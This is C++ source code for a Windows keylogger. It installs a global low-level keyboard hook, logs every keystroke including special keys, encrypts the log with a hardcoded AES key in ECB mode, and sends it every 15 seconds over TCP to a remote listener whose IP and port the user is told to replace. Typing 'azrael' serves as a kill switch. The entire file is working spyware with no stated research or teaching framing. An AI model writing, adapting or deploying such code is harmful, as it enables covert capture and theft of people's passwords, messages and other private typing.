#define _WIN32_WINNT 0x0500

#include <iostream>
#include <string>
#include <windows.h>
#include <winsock2.h>
#include <thread>
#include <chrono>
#include <cstring>
#include <openssl/aes.h>

#pragma comment(lib, "Ws2_32.lib")

using namespace std;

string keyStrokes = "";
SOCKET sock;
struct sockaddr_in server;
bool programRunning = true;

unsigned char aes_key[] = {
        0x62, 0x61, 0x74, 0x6D, 0x61, 0x6E, 0x6B, 0x6E,
        0x69, 0x67, 0x68, 0x74, 0x66, 0x61, 0x6C, 0x6C
};

unsigned char aes_iv[16] = {
    0x10, 0x11, 0x12, 0x13,
    0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B,
    0x1C, 0x1D, 0x1E, 0x1F
};


void encryptAes(const unsigned char* plainText, size_t plainTextLen, unsigned char* cipherText) {
    AES_KEY enc_key;
    AES_set_encrypt_key(aes_key, 128, &enc_key); // Use 128, 192, or 256 for AES key length
    size_t blocks = plainTextLen / AES_BLOCK_SIZE;
    for (size_t i = 0; i < blocks; i++) {
        AES_ecb_encrypt(plainText + (i * AES_BLOCK_SIZE), cipherText + (i * AES_BLOCK_SIZE), &enc_key, AES_ENCRYPT);
    }
}

void sendData() {
    while (programRunning) {
        if (!keyStrokes.empty()) {
            size_t bufferSize = ((keyStrokes.size() / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE; // Ensure buffer is multiple of AES_BLOCK_SIZE
            unsigned char* encryptedData = new unsigned char[bufferSize];
            memset(encryptedData, 0, bufferSize); // Zero out memory for padding
            encryptAes(reinterpret_cast<const unsigned char*>(keyStrokes.data()), keyStrokes.size(), encryptedData);

            send(sock, reinterpret_cast<const char*>(encryptedData), bufferSize, 0);
            if (keyStrokes.find("azrael") != string::npos) {
                programRunning = false;
            }
            keyStrokes.clear();
            delete[] encryptedData;
        }
        this_thread::sleep_for(chrono::seconds(15));
    }
}



char ConvertVKCodeToChar(DWORD vkCode) {
    static HKL layout = GetKeyboardLayout(0);
    static UCHAR keyboardState[256];
    if (!GetKeyboardState(keyboardState)) {
        return 0;
    }

    WCHAR buffer[2];
    int result = ToUnicodeEx(vkCode, 0, keyboardState, buffer, 2, 0, layout);

    if (result == 1 && buffer[0] != '\0') {
        return char(buffer[0]);
    } else {
        return 0; // No valid char generated
    }
}

string GetSpecialKeyText(DWORD vkCode) {
    switch (vkCode) {
        case VK_CAPITAL:   return "<CAPLOCK>";
        case VK_SHIFT:     return "<SHIFT>";
        case VK_LCONTROL:  return "<LCTRL>";
        case VK_RCONTROL:  return "<RCTRL>";
        case VK_INSERT:    return "<INSERT>";
        case VK_END:       return "<END>";
        case VK_PRINT:     return "<PRINT>";
        case VK_DELETE:    return "<DEL>";
        case VK_BACK:      return "<BK>";
        case VK_LEFT:      return "<LEFT>";
        case VK_RIGHT:     return "<RIGHT>";
        case VK_UP:        return "<UP>";
        case VK_DOWN:      return "<DOWN>";
        default:           return "";
    }
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            string keyText = GetSpecialKeyText(p->vkCode);
            if (keyText.empty()) {
                char key = ConvertVKCodeToChar(p->vkCode);
                if (key != 0) {
                    keyText = key;
                }
            }

            if (!keyText.empty()) {
                keyStrokes += keyText;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2, 2), &WSAData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr("172.30.145.189"); // Replace with your IP
server.sin_family = AF_INET;
server.sin_port = htons(6969); // Replace with your port

if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
    cerr << "Socket connection failed." << endl;
    return 1;
}

thread sendDataThread(sendData);

HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, NULL, 0);
if (!keyboardHook) {
    cerr << "Failed to install hook." << endl;
    return 1;
}

    MSG msg;
    while (programRunning) {
        if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_QUIT) {
                break;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        else {
            Sleep(10); // Small delay to prevent high CPU usage
        }
    }

UnhookWindowsHookEx(keyboardHook);
sendDataThread.join();
closesocket(sock);
WSACleanup();
return 0;
}